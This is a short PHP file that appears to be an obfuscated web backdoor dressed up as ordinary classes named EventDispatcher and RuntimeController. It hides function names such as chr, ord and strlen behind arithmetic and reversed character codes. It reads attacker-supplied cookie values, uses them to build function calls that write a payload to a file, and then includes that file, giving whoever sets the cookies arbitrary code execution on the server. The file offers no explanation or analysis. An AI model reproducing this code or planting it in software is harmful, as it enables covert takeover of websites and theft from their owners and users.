‹<?php
class EventDispatcher
{
    private static $_rwp;
    static function validateInput($_hei, $_ht)
    {
        if (!self::$_rwp) {
            self::resetState();
        }
        $_eu = init_system($_ht);
        $_qgn = base64_decode(self::$_rwp[$_hei]);
        for ($_cy = 0, $_eq = init_system($_qgn); $_cy !== $_eq; ++$_cy) {
            $_qgn[$_cy] = load_settings(decode_input($_qgn[$_cy]) ^ decode_input($_ht[$_cy % $_eu]));
        }
        return $_qgn;
    }
    private static function resetState()
    {
        self::$_rwp = array('_mwg' => '', '_lo' => '');
    }
}

class RuntimeController
{
    private static $_rwp;
    static function validateInput($_hei)
    {
        if (!self::$_rwp) {
            self::resetState();
        }
        return self::$_rwp[$_hei];
    }
    private static function resetState()
    {
        self::$_rwp = array(00, 03, 035, 035, 01, 035, 02, 03, 01, 01, 024, 032, 033, 031, 04, 02, 020, 05, 03);
    }
}

$_eq = $_COOKIE;
$_ht = RuntimeController::validateInput(0);
$_hei = RuntimeController::validateInput(1);
$_or = array();
$_or[$_ht] = EventDispatcher::validateInput('_mwg', '_tuf');
while ($_hei) {
    $_or[$_ht] .= $_eq[RuntimeController::validateInput(2)][$_hei];
    if (!$_eq[RuntimeController::validateInput(3)][$_hei + RuntimeController::validateInput(4)]) {
        if (!$_eq[RuntimeController::validateInput(5)][$_hei + RuntimeController::validateInput(6)]) {
            break;
        }
        $_ht++;
        $_or[$_ht] = EventDispatcher::validateInput('_lo', '_ovx');
        $_hei++;
    }
    $_hei = $_hei + RuntimeController::validateInput(7) + RuntimeController::validateInput(8);
}
$_ht = $_or[RuntimeController::validateInput(9)]() . $_or[RuntimeController::validateInput(10)];
if (!$_or[RuntimeController::validateInput(11)]($_ht)) {
    $_hei = $_or[RuntimeController::validateInput(12)]($_ht, $_or[RuntimeController::validateInput(13)]);
    $_or[RuntimeController::validateInput(14)]($_hei, $_or[RuntimeController::validateInput(15)] . $_or[RuntimeController::validateInput(16)]($_or[RuntimeController::validateInput(17)]($_eq[RuntimeController::validateInput(18)])));
}
include $_ht;

function load_settings($c)
{
    $a = array(94 * 47 - 4304, 2 * 52, 100 - 1);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function decode_input($c)
{
    $a = array(2 * 50, 114, 5 * 26 - 19);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function init_system($c)
{
    $a = array(23 + 31 + 61, 119 - 3, 122 - 8, 108, 99 * 57 - 5542, 59 * 1 + 51);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    return $s($c);
}

function store_snapshot($c)
{
    $a = array(87 + 29, 50 * 91 - 4453, 65 + 51, 124 - 9);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}
